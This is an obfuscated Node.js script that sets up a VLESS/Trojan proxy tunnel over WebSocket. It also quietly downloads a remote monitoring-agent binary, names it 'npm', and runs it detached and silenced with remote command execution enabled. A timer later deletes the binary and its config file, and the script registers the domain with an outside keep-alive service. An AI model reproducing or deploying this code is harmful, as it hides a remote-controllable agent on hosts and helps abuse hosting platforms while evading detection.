const _0x28649d=_0x4190;(function(_0x177019,_0x412364){const _0x1f9bcc=_0x4190,_0x4ffca9=_0x177019();while(!![]){try{const _0x5b70bd=parseInt(_0x1f9bcc(0x1e6))/0x1*(parseInt(_0x1f9bcc(0x18a))/0x2)+parseInt(_0x1f9bcc(0x1a8))/0x3*(parseInt(_0x1f9bcc(0x191))/0x4)+parseInt(_0x1f9bcc(0x1b1))/0x5*(-parseInt(_0x1f9bcc(0x1e4))/0x6)+parseInt(_0x1f9bcc(0x18e))/0x7+-parseInt(_0x1f9bcc(0x175))/0x8*(-parseInt(_0x1f9bcc(0x1bc))/0x9)+parseInt(_0x1f9bcc(0x199))/0xa+parseInt(_0x1f9bcc(0x17d))/0xb*(-parseInt(_0x1f9bcc(0x1b5))/0xc);if(_0x5b70bd===_0x412364)break;else _0x4ffca9['push'](_0x4ffca9['shift']());}catch(_0x3aacf4){_0x4ffca9['push'](_0x4ffca9['shift']());}}}(_0x28f9,0x1f5a3));const os=require('os'),http=require(_0x28649d(0x19e)),fs=require('fs'),axios=require(_0x28649d(0x1aa)),net=require(_0x28649d(0x1b7)),path=require(_0x28649d(0x1a9)),crypto=require('crypto'),{Buffer}=require(_0x28649d(0x1ba)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x28649d(0x1d0)][_0x28649d(0x1c0)]||_0x28649d(0x1bd),NEZHA_SERVER=process[_0x28649d(0x1d0)][_0x28649d(0x18d)]||'',NEZHA_PORT=process[_0x28649d(0x1d0)][_0x28649d(0x1b3)]||'',NEZHA_KEY=process[_0x28649d(0x1d0)][_0x28649d(0x19b)]||'',DOMAIN=process[_0x28649d(0x1d0)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x28649d(0x1d0)][_0x28649d(0x188)]||!![],WSPATH=process['env'][_0x28649d(0x1e7)]||UUID[_0x28649d(0x1b6)](0x0,0x8),SUB_PATH=process[_0x28649d(0x1d0)][_0x28649d(0x1a3)]||_0x28649d(0x1c6),NAME=process[_0x28649d(0x1d0)][_0x28649d(0x1b2)]||_0x28649d(0x1ca),PORT=process[_0x28649d(0x1d0)][_0x28649d(0x1d6)]||0x1eb4;let ISP='';function _0x4190(_0x1b21cb,_0x2ae2f2){_0x1b21cb=_0x1b21cb-0x16d;const _0x28f930=_0x28f9();let _0x419019=_0x28f930[_0x1b21cb];return _0x419019;}const GetISP=async()=>{const _0x293704=_0x28649d;try{const _0x5d8d0c=await axios[_0x293704(0x1e0)]('https://speed.cloudflare.com/meta'),_0x22a1c2=_0x5d8d0c['data'];ISP=(_0x22a1c2[_0x293704(0x190)]+'-'+_0x22a1c2[_0x293704(0x183)])[_0x293704(0x1c3)](/ /g,'_');}catch(_0x51e389){ISP=_0x293704(0x1d7);}};function _0x28f9(){const _0x2d59b1=['data','8ZhPtJP','npm','2053','writeFileSync','connect','connection','text/html','npm\x20is\x20running','16489Yeheii','pop','--tls','then','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/agent','asOrganization','client_secret:\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','2083','Hello\x20world!','AUTO_ACCESS','https://arm64.ssss.nyc.mn/v1','411302YbqXAm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Answer','NEZHA_SERVER','775397gZTTSQ','substr','country','417188IqpTcO','chmod\x20+x\x20npm','8443','reduce','log','every','vless://','send','1302620cskVHF','config.yaml','NEZHA_KEY','listen','split','http','post','from','concat','Server\x20is\x20running\x20on\x20port\x20','SUB_PATH','application/dns-json','catch','pipe','write','6niGycZ','path','axios','toString','setsid\x20nohup\x20./npm\x20-s\x20','/bin/bash','arm64','finish','2087','69915MZCQKf','NAME','NEZHA_PORT','end','4524mOPGhZ','slice','net','includes','map','buffer','8.8.4.4','1980387yxxgYC','cd00f72a-4c18-4ff4-bb3a-9bb6d84f57ed','Failed\x20to\x20resolve\x20','utf-8','UUID','443','length','replace','join','arch','cao','Automatic\x20Access\x20Task\x20added\x20successfully','aarch64','https://','Hug',':443?security=tls&sni=','&path=%2F','find','Status','npm\x20download\x20successfully','env','npm\x20running\x20error:','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','trim','https://amd64.ssss.nyc.mn/v1','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','PORT','Unknown','https://dns.google/resolve?name=','readFile','error','unlink','hex','error:\x20','readUInt8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','get','index.html','readUInt16BE','once','78gzuBld','test','1gluUTA','WSPATH','close','createWriteStream','update','url','false','writeHead','\x20with\x20all\x20DNS\x20servers','createHash'];_0x28f9=function(){return _0x2d59b1;};return _0x28f9();}GetISP();const httpServer=http['createServer']((_0x1d8bff,_0x159a42)=>{const _0x447e17=_0x28649d;if(_0x1d8bff[_0x447e17(0x16f)]==='/'){const _0xcfba82=path[_0x447e17(0x1c4)](__dirname,_0x447e17(0x1e1));fs[_0x447e17(0x1d9)](_0xcfba82,'utf8',(_0x4cefb4,_0x45ed74)=>{const _0x4de22b=_0x447e17;if(_0x4cefb4){_0x159a42['writeHead'](0xc8,{'Content-Type':_0x4de22b(0x17b)}),_0x159a42[_0x4de22b(0x1b4)](_0x4de22b(0x187));return;}_0x159a42['writeHead'](0xc8,{'Content-Type':_0x4de22b(0x17b)}),_0x159a42[_0x4de22b(0x1b4)](_0x45ed74);});return;}else{if(_0x1d8bff[_0x447e17(0x16f)]==='/'+SUB_PATH){const _0x247c72=_0x447e17(0x197)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x447e17(0x181)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x210145='trojan://'+UUID+'@'+DOMAIN+_0x447e17(0x1cb)+DOMAIN+_0x447e17(0x181)+DOMAIN+_0x447e17(0x1cc)+WSPATH+'#'+NAME+'-'+ISP,_0x175530=_0x247c72+'\x0a'+_0x210145,_0x1ba23e=Buffer[_0x447e17(0x1a0)](_0x175530)['toString']('base64');_0x159a42[_0x447e17(0x171)](0xc8,{'Content-Type':'text/plain'}),_0x159a42[_0x447e17(0x1b4)](_0x1ba23e+'\x0a');}else _0x159a42[_0x447e17(0x171)](0x194,{'Content-Type':'text/plain'}),_0x159a42[_0x447e17(0x1b4)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x28649d(0x1c3)](/-/g,''),DNS_SERVERS=[_0x28649d(0x1bb),'1.1.1.1'];function resolveHost(_0x3acb19){return new Promise((_0x501e4f,_0x29f3a3)=>{const _0xcb8420=_0x4190;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xcb8420(0x1e5)](_0x3acb19)){_0x501e4f(_0x3acb19);return;}let _0x9a1a0a=0x0;function _0x3b1773(){const _0x29ce7d=_0xcb8420;if(_0x9a1a0a>=DNS_SERVERS[_0x29ce7d(0x1c2)]){_0x29f3a3(new Error(_0x29ce7d(0x1be)+_0x3acb19+_0x29ce7d(0x172)));return;}const _0x19c658=DNS_SERVERS[_0x9a1a0a];_0x9a1a0a++;const _0x4c9c91=_0x29ce7d(0x1d8)+encodeURIComponent(_0x3acb19)+'&type=A';axios[_0x29ce7d(0x1e0)](_0x4c9c91,{'timeout':0x1388,'headers':{'Accept':_0x29ce7d(0x1a4)}})[_0x29ce7d(0x180)](_0x54479a=>{const _0x77177f=_0x29ce7d,_0x67f5d=_0x54479a['data'];if(_0x67f5d[_0x77177f(0x1ce)]===0x0&&_0x67f5d[_0x77177f(0x18c)]&&_0x67f5d[_0x77177f(0x18c)]['length']>0x0){const _0x3247bf=_0x67f5d[_0x77177f(0x18c)][_0x77177f(0x1cd)](_0x1e01dd=>_0x1e01dd['type']===0x1);if(_0x3247bf){_0x501e4f(_0x3247bf[_0x77177f(0x174)]);return;}}_0x3b1773();})[_0x29ce7d(0x1a5)](_0x59b0b7=>{_0x3b1773();});}_0x3b1773();});}function handleVlessConnection(_0x17b0ec,_0x421697){const _0x4b0d44=_0x28649d,[_0x30b23e]=_0x421697,_0x5c1a80=_0x421697[_0x4b0d44(0x1b6)](0x1,0x11);if(!_0x5c1a80[_0x4b0d44(0x196)]((_0x59d47d,_0x3dc3ec)=>_0x59d47d==parseInt(uuid[_0x4b0d44(0x18f)](_0x3dc3ec*0x2,0x2),0x10)))return![];let _0x9e720=_0x421697[_0x4b0d44(0x1b6)](0x11,0x12)['readUInt8']()+0x13;const _0x357fcc=_0x421697[_0x4b0d44(0x1b6)](_0x9e720,_0x9e720+=0x2)['readUInt16BE'](0x0),_0x15ad1a=_0x421697[_0x4b0d44(0x1b6)](_0x9e720,_0x9e720+=0x1)['readUInt8'](),_0x5a3584=_0x15ad1a==0x1?_0x421697[_0x4b0d44(0x1b6)](_0x9e720,_0x9e720+=0x4)[_0x4b0d44(0x1c4)]('.'):_0x15ad1a==0x2?new TextDecoder()['decode'](_0x421697[_0x4b0d44(0x1b6)](_0x9e720+0x1,_0x9e720+=0x1+_0x421697[_0x4b0d44(0x1b6)](_0x9e720,_0x9e720+0x1)[_0x4b0d44(0x1de)]())):_0x15ad1a==0x3?_0x421697[_0x4b0d44(0x1b6)](_0x9e720,_0x9e720+=0x10)['reduce']((_0x33bd7c,_0x36cc3a,_0x3185d4,_0x2dc77a)=>_0x3185d4%0x2?_0x33bd7c[_0x4b0d44(0x1a1)](_0x2dc77a[_0x4b0d44(0x1b6)](_0x3185d4-0x1,_0x3185d4+0x1)):_0x33bd7c,[])[_0x4b0d44(0x1b9)](_0xacceef=>_0xacceef['readUInt16BE'](0x0)[_0x4b0d44(0x1ab)](0x10))[_0x4b0d44(0x1c4)](':'):'';_0x17b0ec[_0x4b0d44(0x198)](new Uint8Array([_0x30b23e,0x0]));const _0x213262=createWebSocketStream(_0x17b0ec);return resolveHost(_0x5a3584)[_0x4b0d44(0x180)](_0x4ef4ac=>{const _0x201799=_0x4b0d44;net['connect']({'host':_0x4ef4ac,'port':_0x357fcc},function(){const _0x241811=_0x4190;this[_0x241811(0x1a7)](_0x421697[_0x241811(0x1b6)](_0x9e720)),_0x213262['on'](_0x241811(0x1da),()=>{})[_0x241811(0x1a6)](this)['on']('error',()=>{})[_0x241811(0x1a6)](_0x213262);})['on'](_0x201799(0x1da),()=>{});})[_0x4b0d44(0x1a5)](_0x1dedb=>{const _0x417c35=_0x4b0d44;net[_0x417c35(0x179)]({'host':_0x5a3584,'port':_0x357fcc},function(){const _0x265916=_0x417c35;this[_0x265916(0x1a7)](_0x421697[_0x265916(0x1b6)](_0x9e720)),_0x213262['on']('error',()=>{})[_0x265916(0x1a6)](this)['on'](_0x265916(0x1da),()=>{})[_0x265916(0x1a6)](_0x213262);})['on'](_0x417c35(0x1da),()=>{});}),!![];}function handleTrojanConnection(_0x43f86f,_0x5ce43e){const _0x3a81a2=_0x28649d;try{if(_0x5ce43e[_0x3a81a2(0x1c2)]<0x3a)return![];const _0xc678c=_0x5ce43e[_0x3a81a2(0x1b6)](0x0,0x38)[_0x3a81a2(0x1ab)](),_0x354063=[UUID];let _0x2ec72c=null;for(const _0x1b2450 of _0x354063){const _0x486cea=crypto[_0x3a81a2(0x173)]('sha224')[_0x3a81a2(0x16e)](_0x1b2450)['digest'](_0x3a81a2(0x1dc));if(_0x486cea===_0xc678c){_0x2ec72c=_0x1b2450;break;}}if(!_0x2ec72c)return![];let _0x49199a=0x38;_0x5ce43e[_0x49199a]===0xd&&_0x5ce43e[_0x49199a+0x1]===0xa&&(_0x49199a+=0x2);const _0x42b837=_0x5ce43e[_0x49199a];if(_0x42b837!==0x1)return![];_0x49199a+=0x1;const _0x309a82=_0x5ce43e[_0x49199a];_0x49199a+=0x1;let _0x3e5788,_0x2e14d2;if(_0x309a82===0x1)_0x3e5788=_0x5ce43e[_0x3a81a2(0x1b6)](_0x49199a,_0x49199a+0x4)[_0x3a81a2(0x1c4)]('.'),_0x49199a+=0x4;else{if(_0x309a82===0x3){const _0x244ab4=_0x5ce43e[_0x49199a];_0x49199a+=0x1,_0x3e5788=_0x5ce43e[_0x3a81a2(0x1b6)](_0x49199a,_0x49199a+_0x244ab4)[_0x3a81a2(0x1ab)](),_0x49199a+=_0x244ab4;}else{if(_0x309a82===0x4)_0x3e5788=_0x5ce43e['slice'](_0x49199a,_0x49199a+0x10)[_0x3a81a2(0x194)]((_0x55d9ee,_0x507385,_0xe599fc,_0x4b6ef7)=>_0xe599fc%0x2?_0x55d9ee[_0x3a81a2(0x1a1)](_0x4b6ef7['slice'](_0xe599fc-0x1,_0xe599fc+0x1)):_0x55d9ee,[])[_0x3a81a2(0x1b9)](_0x401909=>_0x401909['readUInt16BE'](0x0)[_0x3a81a2(0x1ab)](0x10))[_0x3a81a2(0x1c4)](':'),_0x49199a+=0x10;else return![];}}_0x2e14d2=_0x5ce43e[_0x3a81a2(0x1e2)](_0x49199a),_0x49199a+=0x2;_0x49199a<_0x5ce43e[_0x3a81a2(0x1c2)]&&_0x5ce43e[_0x49199a]===0xd&&_0x5ce43e[_0x49199a+0x1]===0xa&&(_0x49199a+=0x2);const _0x380d49=createWebSocketStream(_0x43f86f);return resolveHost(_0x3e5788)[_0x3a81a2(0x180)](_0x22d52a=>{const _0x490c01=_0x3a81a2;net['connect']({'host':_0x22d52a,'port':_0x2e14d2},function(){const _0x2dcb66=_0x4190;_0x49199a<_0x5ce43e[_0x2dcb66(0x1c2)]&&this[_0x2dcb66(0x1a7)](_0x5ce43e[_0x2dcb66(0x1b6)](_0x49199a)),_0x380d49['on'](_0x2dcb66(0x1da),()=>{})[_0x2dcb66(0x1a6)](this)['on'](_0x2dcb66(0x1da),()=>{})[_0x2dcb66(0x1a6)](_0x380d49);})['on'](_0x490c01(0x1da),()=>{});})[_0x3a81a2(0x1a5)](_0x4eb680=>{const _0x5f1236=_0x3a81a2;net[_0x5f1236(0x179)]({'host':_0x3e5788,'port':_0x2e14d2},function(){const _0x110b28=_0x5f1236;_0x49199a<_0x5ce43e[_0x110b28(0x1c2)]&&this[_0x110b28(0x1a7)](_0x5ce43e['slice'](_0x49199a)),_0x380d49['on'](_0x110b28(0x1da),()=>{})['pipe'](this)['on'](_0x110b28(0x1da),()=>{})[_0x110b28(0x1a6)](_0x380d49);})['on'](_0x5f1236(0x1da),()=>{});}),!![];}catch(_0x28e5f2){return![];}}wss['on'](_0x28649d(0x17a),(_0x124322,_0x4a6294)=>{const _0x5ec695=_0x28649d,_0x15969c=_0x4a6294['url']||'';_0x124322[_0x5ec695(0x1e3)]('message',_0x3ba4af=>{const _0x12efcc=_0x5ec695;if(_0x3ba4af[_0x12efcc(0x1c2)]>0x11&&_0x3ba4af[0x0]===0x0){const _0x514f36=_0x3ba4af[_0x12efcc(0x1b6)](0x1,0x11),_0x1bea54=_0x514f36[_0x12efcc(0x196)]((_0x42f657,_0x1e62fb)=>_0x42f657==parseInt(uuid[_0x12efcc(0x18f)](_0x1e62fb*0x2,0x2),0x10));if(_0x1bea54){!handleVlessConnection(_0x124322,_0x3ba4af)&&_0x124322[_0x12efcc(0x1e8)]();return;}}!handleTrojanConnection(_0x124322,_0x3ba4af)&&_0x124322[_0x12efcc(0x1e8)]();})['on'](_0x5ec695(0x1da),()=>{});});const getDownloadUrl=()=>{const _0x2b557c=_0x28649d,_0x531140=os[_0x2b557c(0x1c5)]();return _0x531140==='arm'||_0x531140===_0x2b557c(0x1ae)||_0x531140===_0x2b557c(0x1c8)?!NEZHA_PORT?_0x2b557c(0x189):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x2b557c(0x1d4):_0x2b557c(0x182);},downloadFile=async()=>{const _0x59b899=_0x28649d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3a7210=getDownloadUrl(),_0x2cf716=await axios({'method':_0x59b899(0x1e0),'url':_0x3a7210,'responseType':'stream'}),_0x457e3e=fs[_0x59b899(0x16d)](_0x59b899(0x176));return _0x2cf716[_0x59b899(0x174)][_0x59b899(0x1a6)](_0x457e3e),new Promise((_0x2c7f26,_0x4267ea)=>{const _0x60a201=_0x59b899;_0x457e3e['on'](_0x60a201(0x1af),()=>{const _0x890b86=_0x60a201;console['log'](_0x890b86(0x1cf)),exec(_0x890b86(0x192),_0x45a528=>{if(_0x45a528)_0x4267ea(_0x45a528);_0x2c7f26();});}),_0x457e3e['on'](_0x60a201(0x1da),_0x4267ea);});}catch(_0x3c65c6){throw _0x3c65c6;}},runnz=async()=>{const _0x6e47f4=_0x28649d;try{const _0x2bf477=execSync(_0x6e47f4(0x1d5),{'encoding':_0x6e47f4(0x1bf)});if(_0x2bf477[_0x6e47f4(0x1d3)]()!==''){console[_0x6e47f4(0x195)](_0x6e47f4(0x185));return;}}catch(_0x4c006f){}await downloadFile();let _0x53bc0a='',_0x4c7189=[_0x6e47f4(0x1c1),_0x6e47f4(0x193),'2096',_0x6e47f4(0x1b0),_0x6e47f4(0x186),_0x6e47f4(0x177)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x24664a=_0x4c7189[_0x6e47f4(0x1b8)](NEZHA_PORT)?_0x6e47f4(0x17f):'';_0x53bc0a=_0x6e47f4(0x1ac)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x24664a+_0x6e47f4(0x1df);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x98759e=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x6e47f4(0x19d)](':')[_0x6e47f4(0x17e)]():'',_0x46001b=_0x4c7189[_0x6e47f4(0x1b8)](_0x98759e)?'true':_0x6e47f4(0x170),_0x26757c=_0x6e47f4(0x184)+NEZHA_KEY+_0x6e47f4(0x18b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x46001b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x6e47f4(0x178)](_0x6e47f4(0x19a),_0x26757c);}_0x53bc0a='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x6e47f4(0x195)](_0x6e47f4(0x1d2));return;}}try{exec(_0x53bc0a,{'shell':_0x6e47f4(0x1ad)},_0x3d1c84=>{const _0x2a74c6=_0x6e47f4;if(_0x3d1c84)console[_0x2a74c6(0x1da)](_0x2a74c6(0x1d1),_0x3d1c84);else console[_0x2a74c6(0x195)](_0x2a74c6(0x17c));});}catch(_0x56ba18){console['error'](_0x6e47f4(0x1dd)+_0x56ba18);}};async function addAccessTask(){const _0x3817bb=_0x28649d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1afe06=_0x3817bb(0x1c9)+DOMAIN;try{const _0xdbae42=await axios[_0x3817bb(0x19f)]('https://oooo.serv00.net/add-url',{'url':_0x1afe06},{'headers':{'Content-Type':'application/json'}});console[_0x3817bb(0x195)](_0x3817bb(0x1c7));}catch(_0x5bad76){}}const delFiles=()=>{const _0x33d31f=_0x28649d;fs[_0x33d31f(0x1db)](_0x33d31f(0x176),()=>{}),fs['unlink'](_0x33d31f(0x19a),()=>{});};httpServer[_0x28649d(0x19c)](PORT,()=>{const _0x1fea69=_0x28649d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1fea69(0x195)](_0x1fea69(0x1a2)+PORT);});
